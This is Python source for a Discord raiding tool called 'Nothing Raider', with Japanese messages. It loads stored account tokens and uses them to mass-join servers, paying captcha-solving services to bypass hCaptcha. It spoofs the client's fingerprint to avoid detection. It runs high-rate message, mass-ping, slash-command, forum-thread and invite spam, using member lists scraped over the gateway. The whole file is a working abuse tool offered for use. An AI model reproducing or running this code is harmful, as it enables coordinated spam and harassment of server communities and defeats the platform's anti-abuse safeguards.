# Copyright (c) 2025 AtsuageZ
# Licensed under the Custom License - Non-commercial use only, attribution required.

import tkinter.messagebox
import requests
import threading
import time
import os
import uuid
import random
import base64
import json
import string
import websocket
import tkinter
import re
import io
import tls_client
import toml
import struct
import socket
import concurrent.futures
import pyaudio
import numpy as np
from pydub import AudioSegment
from datetime import datetime
from urllib.parse import urlencode, urlparse, parse_qs
import customtkinter as ctk
from concurrent.futures import ThreadPoolExecutor, as_completed
import tkinter.filedialog
import nacl.secret
import nacl.utils
import ffmpeg
from itertools import cycle
from io import BytesIO
import mimetypes

RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
END = '\033[39m'

spamming = False
spammingOLD = False
stop_spamming = False
stop_custom_spam = False
config = toml.load('config.toml')
API_KEY = config['settings']['api_key']
site_key = "a9b5fb07-92ff-493f-86fe-352a2803b3df"

PICTURE_FOLDER = 'avatar'

with open('tokens.txt', 'r') as file:
    tokens1 = [line.strip() for line in file]

TIMEnow = datetime.now()
BASE_URL = "https://discord.com/api/v9"
IMAGE_FOLDER = "avatar"

with open('tokens.txt', 'r') as f:
    tokens = [token.strip() for token in f.readlines()]

token_count = len(tokens)

with open('custom.txt', 'r', encoding='utf-8') as f:
    messages = [line.strip() for line in f.readlines() if line.strip()]

with open('bot.txt', 'r', encoding='utf-8') as f:
    BOTmessages = [line.strip() for line in f.readlines() if line.strip()]

def noncegen():
    return str((int(time.mktime(datetime.now().timetuple())) * 1000 - 1420070400000) * 4194304)

def nowtime():
    return time.strftime("%H:%M:%S")

def generate_precise_state(guild_id):
    guild_int = int(guild_id)
    
    MASK64 = 0xFFFFFFFFFFFFFFFF

    guild_high = (guild_int >> 48) & MASK64
    guild_mid = (guild_int >> 32) & MASK64
    guild_low = (guild_int >> 16) & MASK64
    guild_ext = guild_int & MASK64

    combined1 = (
        (guild_high << 48) |
        (guild_mid << 32) |
        (guild_low << 16) |
        guild_ext
    )
    
    final_state = f"{combined1:016X}"

    return final_state

def extract_invite_code(url):
    try:
        parsed_url = urlparse(url)
        path = parsed_url.path.strip('/')  
        if path.startswith('invite/'):
            return path.split('/')[-1]
        elif path:
            return path
        else:
            return None
    except Exception as e:
        print(f"Error extracting invite code: {e}")
        return None

def validate_token(token):
    return True

def create_session():
    session = tls_client.Session(
        client_identifier="chrome_124",
        random_tls_extension_order=True
    )

    session.headers.update({
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": "https://discord.com/",
        "origin": "https://discord.com",
        "x-discord-locale": "en-US",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    })

    return session

session = create_session()

def get_headers(token):
    cookies = get_discord_cookies()
    props = get_super_properties()
    return {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "ja-JP,ja;q=0.9",
        "authorization": token,
        "cookie": cookies,
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9028 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-discord-locale": "ja",
        'x-debug-options': 'bugReporterEnabled',
        "x-super-properties": props,
    }

def get_discord_cookies():
    try:
        response = requests.get("https://discord.com")
        if response.status_code == 200:
            return "; ".join(
                [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
            ) + "; locale=en-US"
        else:
            return "__dcfduid=4e0a8d504a4411eeb88f7f88fbb5d20a; __sdcfduid=4e0a8d514a4411eeb88f7f88fbb5d20ac488cd4896dae6574aaa7fbfb35f5b22b405bbd931fdcb72c21f85b263f61400; __cfruid=f6965e2d30c244553ff3d4203a1bfdabfcf351bd-1699536665; _cfuvid=rNaPQ7x_qcBwEhO_jNgXapOMoUIV2N8FA_8lzPV89oM-1699536665234-0-604800000; locale=en-US"
    except Exception as e:
        print(f"(ERR) {e} (get_discord_cookies)")

cookies = get_discord_cookies()

def parse_cookie_string(cookie_str):
    cookies = {}
    for part in cookie_str.split("; "):
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k] = v
    return cookies

def get_super_properties(): #thanks kotetsu599
    try:
        payload = {
            "os": "Windows",
            "browser": "Discord Client",
            "release_channel": "stable",
            "client_version": "1.0.9028",
            "os_version": "10.0.19045",
            "system_locale": "en",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9028 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "browser_version": "22.3.26",
            "client_build_number": 256231,
            "native_build_number": 41936,
            "client_event_source": None,
        }
        properties = base64.b64encode(json.dumps(payload).encode()).decode()
        return properties
    except Exception as e:
        print(f"(ERR) {e} (get_super_properties)")

properties = get_super_properties()

def headers(token, cookies):
    return {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "ja",
        "authorization": token,
        "cookie": cookies,
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "x-discord-locale": "ja",
        'x-debug-options': 'bugReporterEnabled',
        "x-super-properties": properties,
    }

def solve_hcaptcha(sitekey, invite):
    payload = {
        "clientKey": API_KEY,
        "task": {
            "type": 'HCaptchaTaskProxyLess',
            "websiteKey": sitekey,
            "websiteURL": invite
        }
    }
    response = requests.post("https://api.capsolver.com/createTask", json=payload)
    response_data = response.json()
    task_id = response_data.get("taskId")
    if not task_id:
        print(f"(ERR) Failed to create task: {response.text}")
        return None
    print(f"Got taskId: {task_id} / Getting result...")

    while True:
        time.sleep(1)
        result_response = requests.post("https://api.capsolver.com/getTaskResult", json={"clientKey": API_KEY, "taskId": task_id})
        result_data = result_response.json()
        if result_data.get("status") == "ready":
            return result_data.get("solution", {}).get('gRecaptchaResponse')
        if result_data.get("status") == "failed" or result_data.get("errorId"):
            print(f"Solve failed! response: {result_response.text}")
            return None
    
def solve_2captcha(sitekey, invite, captcha_rqdata=None, captcha_rqtoken=None):
    twocaptcha_api_key = config['settings']['twocaptcha_api_key']
    if not twocaptcha_api_key:
        print(f"{RED}2Captcha APIキーが設定されていません。{END}")
        return None

    try:
        payload = {
            "key": twocaptcha_api_key,
            "method": "hcaptcha",
            "sitekey": sitekey,
            "pageurl": f"https://discord.com/invite/{invite}",
            "json": 1,
            "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "invisible": 1
        }
        if captcha_rqdata:
            payload['data'] = captcha_rqdata
        if captcha_rqtoken:
            payload['rqtoken'] = captcha_rqtoken

        response = requests.post("https://2captcha.com/in.php", data=payload)
        response_data = response.json()

        if response_data.get("status") != 1:
            print(f"{RED}2Captchaタスク作成失敗: {response_data.get('error_text')}{END}")
            return None

        task_id = response_data.get("request")
        print(f"2Captcha Task ID: {task_id} / 結果を待機中...")

        while True:
            time.sleep(5)
            result_payload = {
                "key": twocaptcha_api_key,
                "action": "get",
                "id": task_id,
                "json": 1
            }
            result_response = requests.get("https://2captcha.com/res.php", params=result_payload)
            result_data = result_response.json()

            if result_data.get("status") == 1:
                captcha_solution = result_data.get("request")
                print(f"{GREEN}2Captcha解決成功！トークン: {captcha_solution[:50]}...{END}")
                return captcha_solution
            elif result_data.get("status") == 0 and "CAPCHA_NOT_READY" in result_data.get("request"):
                continue
            else:
                print(f"{RED}2Captcha解決失敗: {result_data.get('error_text')}{END}")
                return None

    except Exception as e:
        print(f"{RED}2Captchaエラー: {e}{END}")
        return None

def join_discord_server(token, invite, use_captcha, captcha_service="capsolver"):
    try:
        session = create_session()
        payload = {"session_id": uuid.uuid4().hex}
        response = session.post(
            f"https://discord.com/api/v9/invites/{invite}",
            headers=get_headers(token),
            json=payload
        )
        hide_token = token[:25].rstrip() + '#'

        if response.status_code == 200:
            status = f"{GREEN}[参加]{MAGENTA}{hide_token}{END}{invite}|{response.json()['guild']['name']}"
        elif response.status_code == 400:
            status = f"{YELLOW}[キャプチャ]{MAGENTA}{hide_token}{END}{invite}"
            if use_captcha:
                response_json = response.json()
                captcha_sitekey = response_json.get("captcha_sitekey", site_key)
                captcha_rqdata = response_json.get("captcha_rqdata")
                captcha_rqtoken = response_json.get("captcha_rqtoken")

                captcha_response = None
                if captcha_service == "2captcha":
                    captcha_response = solve_2captcha(captcha_sitekey, invite, captcha_rqdata, captcha_rqtoken)
                else:
                    captcha_response = solve_hcaptcha(captcha_sitekey, invite, captcha_rqdata, captcha_rqtoken)

                if captcha_response:
                    payload['captcha_key'] = captcha_response
                    payload['captcha_rqdata'] = captcha_rqdata
                    payload['captcha_rqtoken'] = captcha_rqtoken

                    response = session.post(
                        f"https://discord.com/api/v9/invites/{invite}",
                        headers=get_headers(token),
                        json=payload
                    )
                    if response.status_code == 200:
                        status = f"{GREEN}[CAPTCHAを解決し、参加]{MAGENTA}{hide_token}{END}{invite}|{response.json()['guild']['name']}"
                    else:
                        status = f"{RED}FAILED{hide_token}##{response.status_code}:{response.text}"
                else:
                    status = f"{RED}CAPTCHA解決失敗{hide_token}##"
            else:
                status = f"{YELLOW}CAPTCHA認証が必要{MAGENTA}{hide_token}{END}{invite}"
        elif response.status_code == 429:
            status = f"{BLUE}[レート制限]{MAGENTA}{hide_token}{END}{invite}"
        else:
            status = f"{RED}FAILED{hide_token}##{response.status_code}:{response.text}"
    except Exception as e:
        status = f"{RED}FAILED{hide_token}##Exception:{str(e)}"

    return status

def joiner(token, invite_code, use_captcha, captcha_service, delay):
    status = join_discord_server(token, invite_code, use_captcha, captcha_service)
    print(status)
    time.sleep(delay)
    
def check_guild_membership(guild_id):
    not_in_guild = []

    for token in tokens:
        hide_token = token[:25].rstrip() + '#'
        headers = {
            'Authorization': token
        }

        response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)

        if response.status_code == 200:
            guilds = response.json()
            if not any(g['id'] == guild_id for g in guilds):
                not_in_guild.append(token)
                print(f'未参加: {hide_token}')
            else:
                print(f'参加済み: {hide_token}')
        else:
            print(f'エラー: {hide_token} → {response.status_code}')

    if not_in_guild:
        with open(f'no-in-guild-{guild_id}.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(not_in_guild))
        print(f'{len(not_in_guild)}個のトークンが未参加 詳しくは出力されたtxtをご確認ください。')
    else:
        print('すべてのトークンが参加済みです。')

def leaver(server_id):
    for token in tokens:
        hide_token = token[:25].rstrip() + '#'
        headers = {'Authorization': token}
        response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{server_id}', headers=headers)
        if response.status_code == 204:
            print(f'サーバーから退出しました。:{hide_token}')

def spammerOLD(channel_id, message):
    global spammingOLD
    spammingOLD = True
    os.system('title Nothing Raider - Spammer')
    def spam_thread():
        while spammingOLD:
            for token in tokens:
                hide_token = token[:25].rstrip() + '#'
                headers = {'Authorization': token, 'Content-Type': 'application/json'}
                data = {'content': message}
                
                try:
                    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
                    
                    if response.status_code == 200:
                        print(nowtime() + MAGENTA + f'Send: {hide_token}' + END)
                    elif response.status_code == 429:
                        retry_after = response.json()['retry_after']
                        print(nowtime() + YELLOW + f'[RATE LIMIT] Retrying after {retry_after} seconds.' + END)
                        time.sleep(retry_after)
                    else:
                        print(nowtime() + RED + f'Failed to send message with token {hide_token}. Status code: {response.status_code}' + END)
                
                except requests.exceptions.RequestException as e:
                    print(f'Error occurred while sending message with token {hide_token}: {str(e)}')

    threads = []
    for _ in range(10):
        t = threading.Thread(target=spam_thread)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

class Utils:
    @staticmethod
    def get_ranges(start, step, total):
        ranges = []
        for i in range(start, total, step):
            ranges.append([i, min(i + step - 1, total - 1)])
        return ranges

    @staticmethod
    def parse_member_list_update(decoded):
        data = decoded["d"]
        return {
            "guild_id": data["guild_id"],
            "types": [op["op"] for op in data["ops"]],
            "updates": [op.get("items", []) for op in data["ops"]]
        }

def check_token_in_guild(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, timeout=5)
        if response.status_code == 200:
            print(GREEN + f"Token {token[:25]}... is in guild {guild_id}" + END)
            return True
        else:
            print(YELLOW + f"Token {token[:25]}... not in guild {guild_id} (Status: {response.status_code})" + END)
            return False
    except requests.exceptions.RequestException as e:
        print(RED + f"Error checking token {token[:25]}...: {e}" + END)
        return False

def check_tokens_in_guild_multithread(tokens, guild_id, max_workers=10):
    valid_tokens = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_token = {executor.submit(check_token_in_guild, token, guild_id): token for token in tokens}

        for future in as_completed(future_to_token):
            token = future_to_token[future]
            try:
                if future.result():
                    valid_tokens.append(token)
            except Exception as e:
                print(RED + f"Exception for token {token[:25]}...: {e}" + END)
    
    return valid_tokens

joined_tokens = []

layor = 0
def process_json(data, values=None, indexes=None):
    global layor
    if isinstance(data, dict):
        data.pop("description", None)
        result = process_json(data["options"], values, indexes) if data.get("options") is not None else (data.update({"options": []}) or data["options"])
        data["options"] = [result] if not isinstance(result, list) else result
        return data
    elif isinstance(data, list):
        if data[0].get("required", None) is not None:
            options = []
            for i, option in enumerate(data):
                option.pop("description")
                option.pop("required")
                try:
                    option.pop("channel_types")
                except:
                    pass
                if values is not None:
                    option["value"] = values[i]
                options.append(option)
            return options
        data = data[indexes[layor]]
        data.pop("description", None)
        layor += 1
        data = process_json(data, values, indexes)
        return data

def process_guild_checker(tokens, guild_id):
    threads = []
    for token in tokens:
        token = token.strip()
        thread = threading.Thread(target=guild_checker, args=(guild_id, token))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    os.system("cls")

def guild_checker(guild_id, token):
    if requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", headers=get_headers(token)).status_code == 200:
        joined_tokens.append(token)

def process_command_spammer(tokens, channel_link, main_command):
    pattern = r'https://discord.com/channels/(\d+)/(\d+)'
    match = re.match(pattern, channel_link)
    if match:
        guild_id = match.group(1)
        channel_id = match.group(2)
    else:
        print("チャンネルリンクが無効です。")
        time.sleep(1)
        os.system("cls")
        return

    i = 0
    process_guild_checker(tokens, guild_id)
    r = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/application-command-index", headers=get_headers(random.choice(joined_tokens)))

    found = {}
    calculated = False

    while True:
        if not calculated:
            try:
                application_command = r.json()["application_commands"][i]
                commands = main_command.split()
                if application_command["name"] == commands[0]:
                    application_id = application_command["application_id"]
                    for bot in r.json()["applications"]:
                        if application_id == bot["id"]:
                            name = bot["name"]
                            break
                    found[i] = name
                i += 1
                continue
            except:
                if found == {}:
                    input("不明なコマンド")
                    return
                if len(found.keys()) != 1:
                    print("複数botがそのコマンドを持っています。どれにしますか？")
                    choice_name = {}
                    for i, name in enumerate(found.values()):
                        choice_name[i] = name
                    for i, name in enumerate(choice_name.values()):
                        print(f"  {i}:{name}")
                    choice = int(input("数字で選択:"))
                    name = choice_name[choice]
                    i = [key for key, value in found.items() if value == name][0]
                else:
                    i = list(found.keys())[0]

                application_command = r.json()["application_commands"][i]
                options = []
                commands = main_command.split()

                if application_command["name"] == commands[0]:
                    id = application_command["id"]
                    app_id = application_command["application_id"]
                    version = application_command["version"]
                    if application_command.get("options", None) is not None:
                        option_contents = {}
                        if len(commands) != 1:
                            indexes = []
                            option = None
                            for _ in range(len(commands)):
                                option = application_command["options"] if option is None else option
                                for p in range(len(option)):
                                    if option[p]["name"] == commands[_]:
                                        indexes.append(p)
                                        options.append(option)
                                        option = option[p]["options"] if option[p].get("options", None) is not None else "FUCK"
                                        break
                                if option == "FUCK":
                                    break
                            values = []
                            if option != "FUCK":
                                for _ in range(len(option)):
                                    desc = option[_].get("description", None)
                                    v = uuid.uuid4().hex if (v := input(f"{option[_]['name']}{f'...{desc}' if desc is not None else ''}:")) == "random" else v
                                    values.append(v)
                                options = process_json(application_command["options"], values, indexes)
                            else:
                                options = process_json(application_command["options"], indexes=indexes)
                        else:
                            for option in application_command["options"]:
                                desc = option.get("description", None)
                                v = uuid.uuid4().hex if (v := input(f"{option['name']}{f'...{desc}' if desc is not None else ''}:")) == "random" else v
                                option_contents[option["name"]] = [option["type"], v]
                            for name in list(option_contents.keys()):
                                json = {
                                    "type": option_contents[name][0],
                                    "name": name,
                                    "value": option_contents[name][1]
                                }
                                options.append(json)
                    break
                else:
                    i += 1

    threads = []
    for token in joined_tokens:
        token = token.strip()
        thread = threading.Thread(target=command_spammer, args=(app_id, guild_id, channel_id, version, id, commands, options, token))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    input("continue:")
    os.system("cls")

def command_spammer(app_id, guild_id, channel_id, version, id, commands, options, token):
    if not isinstance(options, list):
        options_payload = [options]
    else:
        options_payload = options

    header = get_headers(token)
    while True:
        payload_json = {
            "type": 2,
            "application_id": app_id,
            "guild_id": guild_id,
            "channel_id": channel_id,
            "session_id": uuid.uuid4().hex,
            "data": {
                "version": version,
                "id": id,
                "name": commands[0],
                "type": 1,
                "options": options_payload,
                "application_command": {
                    "id": id,
                    "type": 1,
                    "application_id": app_id,
                    "version": version,
                    "name": commands[0],
                    "dm_permission": True,
                    "integration_types": [0, 1],
                    "global_popularity_rank": 3,
                    "options": [],
                    "name_localized": commands[0]
                },
                "attachments": []
            },
            "nonce": nonce(),
            "analytics_location": "slash_ui"
        }

        payload = {"payload_json": json.dumps(payload_json)}
        r = session.post("https://discord.com/api/v9/interactions", headers=header, json=payload)
        tokena = token[:25].rstrip() + "*"
        if r.status_code == 204:
            print(GREEN + "[成功]" + END + MAGENTA + tokena + END)
        elif r.status_code == 401:
            print(RED + "[失敗]" + END + MAGENTA + tokena + END)
        elif r.status_code == 403:
            print(YELLOW + "[ロック]" + END + MAGENTA + tokena + END)
        elif r.status_code == 429:
            print(YELLOW + "[レートリミット]" + END + MAGENTA + tokena + END + " " + str(r.json()["retry_after"]) + "秒")
            time.sleep(r.json()["retry_after"])
        else:
            print(BLUE + "[不明なエラー] " + END + MAGENTA + tokena + END + str(r.status_code))

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.blacklisted_ids = {"1100342265303547924", "1190052987477958806", "833007032000446505", 
                                "1273658880039190581", "1308012310396407828", "1326906424873193586", 
                                "1334512667456442411"}
        self.members = {}
        self.guilds = {}
        self.ranges = [[0, 0]]
        self.last_range = 0
        self.packets_recv = 0
        self.end_scraping = False

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9",
            header=headers,
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close,
            on_error=self.on_error,
        )

    def run(self):
        print(f"Starting WebSocket for guild {self.guild_id} with token {self.token[:25]}...")
        self.run_forever()
        self.save_members_to_file()
        return self.members

    def save_members_to_file(self):
        try:
            os.makedirs("pings", exist_ok=True)
            filepath = f"pings/{self.guild_id}.txt"
            with open(filepath, "w", encoding="utf-8") as f:
                if not self.members:
                    print(YELLOW + f"No members scraped for guild {self.guild_id}" + END)
                    f.write("")
                else:
                    for user_id in self.members.keys():
                        f.write(f"{user_id}\n")
                    print(GREEN + f"Saved {len(self.members)} member IDs to {filepath}" + END)
        except Exception as e:
            print(RED + f"Failed to save members to file: {e}" + END)

    def scrape_users(self):
        if not self.end_scraping:
            print(f"Scraping users with range {self.ranges}")
            self.send(json.dumps({
                "op": 14,
                "d": {
                    "guild_id": self.guild_id,
                    "typing": True,
                    "activities": True,
                    "threads": True,
                    "channels": {self.channel_id: self.ranges}
                }
            }))

    def on_open(self, ws):
        print(GREEN + "WebSocket connection opened" + END)
        self.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                },
                "presence": {"status": "online", "since": 0, "activities": [], "afk": False},
                "compress": False,
            }
        }))

    def heartbeat_thread(self, interval):
        while not self.end_scraping:
            self.send(json.dumps({"op": 1, "d": self.packets_recv}))
            time.sleep(interval)

    def on_message(self, ws, message):
        decoded = json.loads(message)
        if not decoded:
            return
        self.packets_recv += decoded["op"] != 11
        if decoded["op"] == 10:
            threading.Thread(target=self.heartbeat_thread, args=(decoded["d"]["heartbeat_interval"] / 1000,), daemon=True).start()
            print(f"Heartbeat interval set to {decoded['d']['heartbeat_interval'] / 1000} seconds")
        if decoded["t"] == "READY":
            self.guilds.update({guild["id"]: {"member_count": guild["member_count"]} for guild in decoded["d"]["guilds"]})
            print(f"Guilds loaded: {self.guilds}")
        if decoded["t"] == "READY_SUPPLEMENTAL":
            self.ranges = Utils.get_ranges(0, 100, self.guilds.get(self.guild_id, {"member_count": 0})["member_count"])
            self.scrape_users()
        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parse_member_list_update(decoded)
            if parsed["guild_id"] == self.guild_id:
                self.process_updates(parsed)

    def process_updates(self, parsed):
        if "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]:
            for i, update_type in enumerate(parsed["types"]):
                if update_type in {"SYNC", "UPDATE"}:
                    if not parsed["updates"][i]:
                        self.end_scraping = True
                        print(YELLOW + "No more updates, ending scrape" + END)
                        break
                    self.process_members(parsed["updates"][i])
                self.last_range += 1
                self.ranges = Utils.get_ranges(self.last_range, 100, self.guilds.get(self.guild_id, {"member_count": 0})["member_count"])
                time.sleep(0.65)
                self.scrape_users()
        if self.end_scraping:
            self.close()

    def process_members(self, updates):
        for item in updates:
            member = item.get("member")
            if member:
                user = member.get("user", {})
                user_id = user.get("id")
                if user_id and user_id not in self.blacklisted_ids and not user.get("bot"):
                    self.members[user_id] = {"tag": f"{user.get('username')}#{user.get('discriminator')}", "id": user_id}
        print(f"Processed members, current count: {len(self.members)}")

    def on_close(self, ws, close_code, close_msg):
        print(GREEN + f"WebSocket closed. Scraped {len(self.members)} members" + END)

    def on_error(self, ws, error):
        print(RED + f"WebSocket error: {error}" + END)

def load_members_from_file(guild_id):
    filepath = f"pings/{guild_id}.txt"
    member_ids = []
    if os.path.exists(filepath):
        with open(filepath, "r", encoding="utf-8") as f:
            member_ids = [line.strip() for line in f if line.strip()]
        print(GREEN + f"Loaded {len(member_ids)} member IDs from {filepath}" + END)
    else:
        print(YELLOW + f"No member file found for guild {guild_id}" + END)
    return member_ids

spamming = False

def generate_random_string(length=6):
    """6文字のランダムな大小文字混在の文字列を生成"""
    return ''.join(random.choices(string.ascii_letters, k=length))



def spammer(channel_id, message, guild_id=None, mass_ping=False, ping_count=0, random_string=False, messages_per_second=1.0, turbo_mode=False, cycle_interval=0.1):
    os.system('title Nothing Raider - Spammer Discord.gg/QRNutfWSpK')
    global spamming
    spamming = True

    if messages_per_second > 10.0 or turbo_mode:
        print(YELLOW + "警告: 10メッセージ/秒以上または爆速モードはレートリミットに引っかかる可能性が高いです。推奨しません。" + END)

    valid_tokens = check_tokens_in_guild_multithread(tokens, guild_id) if guild_id else tokens
    if not valid_tokens:
        print(RED + "No valid tokens found for this guild. Aborting." + END)
        return

    member_ids = []
    if mass_ping and guild_id:
        member_ids = load_members_from_file(guild_id)
        if not member_ids:
            print(YELLOW + "No members found. Scraping now with a valid token..." + END)
            socket = DiscordSocket(valid_tokens[0], guild_id, channel_id)
            threading.Thread(target=socket.run, daemon=True).start()
            time.sleep(15)
            member_ids = list(socket.members.keys())

    sleep_interval = 1.0 / max(messages_per_second, 0.1)

    def send_message_with_token(token, message_content):
        hide_token = token[:25].rstrip() + '#'
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        data = {'content': message_content}

        try:
            response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
            if response.status_code == 200:
                print(GREEN + "[Success!]" + MAGENTA + hide_token + END)
            elif response.status_code == 429:
                print(YELLOW + "[RATELIMIT] 高頻度送信が制限されています: " + MAGENTA + hide_token + END)
                return False
            elif response.status_code in [401, 403]:
                print(RED + f'Missing access token {hide_token}' + END)
                return False
            else:
                print(f'Failed to send message with token {hide_token}. Status code: {response.status_code}')
                return False
        except requests.exceptions.RequestException as e:
            print(f'Error occurred with token {hide_token}: {str(e)}')
            return False
        return True

    def spam_loop_turbo():
        with ThreadPoolExecutor(max_workers=len(valid_tokens)) as executor:
            while spamming:
                futures = []
                for token in valid_tokens:
                    final_message = message
                    if mass_ping and member_ids:
                        pings = [f"<@{random.choice(member_ids)}>" for _ in range(min(ping_count, len(member_ids)))]
                        final_message = f"{message} {' '.join(pings)}"
                    if random_string:
                        final_message = f"{final_message} {generate_random_string()}"
                    futures.append(executor.submit(send_message_with_token, token, final_message))
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        print(RED + f"Thread error: {e}" + END)
                time.sleep(sleep_interval)

    def spam_loop_normal():
        token_cycle = cycle(valid_tokens)
        while spamming:
            token = next(token_cycle)
            final_message = message
            if mass_ping and member_ids:
                pings = [f"<@{random.choice(member_ids)}>" for _ in range(min(ping_count, len(member_ids)))]
                final_message = f"{message} {' '.join(pings)}"
            if random_string:
                final_message = f"{final_message} {generate_random_string()}"
            if send_message_with_token(token, final_message):
                time.sleep(max(sleep_interval, cycle_interval))


    threading.Thread(target=spam_loop_turbo if turbo_mode else spam_loop_normal, daemon=True).start()


spamming_invites = False

def invite_spammer(channel_id, guild_id):
    global spamming_invites
    spamming_invites = True

    try:
        with open('tokens.txt', 'r') as f:
            tokens = [t.strip() for t in f if t.strip()]
    except FileNotFoundError:
        print("tokens.txt が見つかりません。")
        return

    if not tokens:
        print("有効なトークンがありません。")
        return

    token_cycle = cycle(tokens)
    os.makedirs("invites", exist_ok=True)
    save_path = f"invites/invite-{guild_id}.txt"

    def create_invite(token):
        headers = {
            'authorization': token,
            'content-type': 'application/json'
        }
        data = {
            "validate": None,
            "max_age": 0,
            "max_uses": 0,
            "temporary": False,
            "flags": 0
        }

        try:
            res = requests.post(
                f'https://discord.com/api/v9/channels/{channel_id}/invites',
                headers=headers,
                json=data
            )
            if res.status_code == 200:
                code = res.json().get("code")
                url = f"https://discord.gg/{code}"
                print(f"[✔] {url}")
                with open(save_path, "a", encoding="utf-8") as f:
                    f.write(url + "\n")
            elif res.status_code == 429:
                print(f"[RateLimit] {token[:20]}... 一時停止")
            elif res.status_code in [401, 403]:
                print(f"[Invalid Token] {token[:20]}...")
            else:
                print(f"[Error {res.status_code}] {res.text}")
        except Exception as e:
            print(f"[RequestError] {e}")

    def loop():
        while spamming_invites:
            token = next(token_cycle)
            threading.Thread(target=create_invite, args=(token,), daemon=True).start()
            time.sleep(0.1)

    threading.Thread(target=loop, daemon=True).start()

def stop_invite_spammer():
    global spamming_invites
    spamming_invites = False

spamming = False
forbidden_channels = set()

def forum_spammer(channel_id, message, token_list, thread_name_base="Thread", interval=2):
    global spamming
    spamming = True

    def spam_thread(token):
        headers = {
            'authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0',
        }

        params = {
            'use_nested_fields': 'true',
        }

        count = 0
        while spamming:
            count += 1
            thread_name = f"{thread_name_base}-{random.randint(1000, 9999)}-{count}"

            json_data = {
                'name': thread_name,
                'auto_archive_duration': 4320,
                'applied_tags': [],
                'message': {
                    'content': message,
                },
            }

            response = requests.post(
                f'https://discord.com/api/v9/channels/{channel_id}/threads',
                params=params,
                headers=headers,
                json=json_data
            )

            if response.status_code == 200:
                print(f"[SUCCESS] Thread '{thread_name}' posted with token {token[:20]}...")
            elif response.status_code == 429:
                retry_after = response.json().get("retry_after", 5)
                print(f"[RATELIMIT] Waiting {retry_after} seconds...")
                time.sleep(retry_after)
            else:
                print(f"[ERROR {response.status_code}] {response.text}")

            time.sleep(interval)

    for token in token_list:
        threading.Thread(target=spam_thread, args=(token,), daemon=True).start()

def get_command_id(token, guild_id, application_id, command_name):
    headers = get_headers(token)
    

    try:
        response = requests.get(
            f"{BASE_URL}/guilds/{guild_id}/commands",
            headers=headers
        )
        print(f"Guild commands response: {response.status_code}, {response.text}")
        if response.status_code == 200:
            commands = response.json()
            for cmd in commands:
                if cmd["application_id"] == application_id and cmd["name"] == command_name:
                    print(f"Found command: {cmd['name']} with ID: {cmd['id']}")
                    return cmd["id"]
            print(f"Command '{command_name}' not found in guild {guild_id} for application {application_id}")
        else:
            print(f"Failed to fetch guild commands. Status code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching guild commands: {str(e)}")


    try:
        response = requests.get(
            f"{BASE_URL}/applications/{application_id}/commands",
            headers=headers
        )
        print(f"Global commands response: {response.status_code}, {response.text}")
        if response.status_code == 200:
